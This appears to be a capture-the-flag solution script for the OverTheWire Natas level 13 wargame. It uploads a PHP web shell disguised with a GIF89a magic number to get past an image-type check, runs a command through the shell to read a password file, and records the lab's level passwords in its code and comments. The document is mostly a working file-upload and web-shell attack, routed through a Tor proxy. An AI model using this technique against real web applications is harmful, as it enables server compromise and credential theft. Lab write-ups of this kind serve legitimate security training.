#!/usr/bin/python3

import requests

# website credentials and proxy
url = 'http://natas13.natas.labs.overthewire.org/'
username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'
proxies = {"http": "socks5://127.0.0.1:9050"}


# web request
s = requests.Session()
# content = s.get(url, auth=(username,password), proxies=proxies)

files = {'uploadedfile': open('webshell.php','rb')}

data = {
		"MAX_FILE_SIZE": "1000", 
		"filename": "webshell.php",
		"uploadedfile" : "file"
}

content = s.get(url + 'upload/6yadxomdph.php?cmd=cat /etc/natas_webpass/natas14',files=files,data=data,auth=(username,password), proxies=proxies)


# natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
# i used GIF89a magic number to get bypass the exif_imagetype function

print(content.text)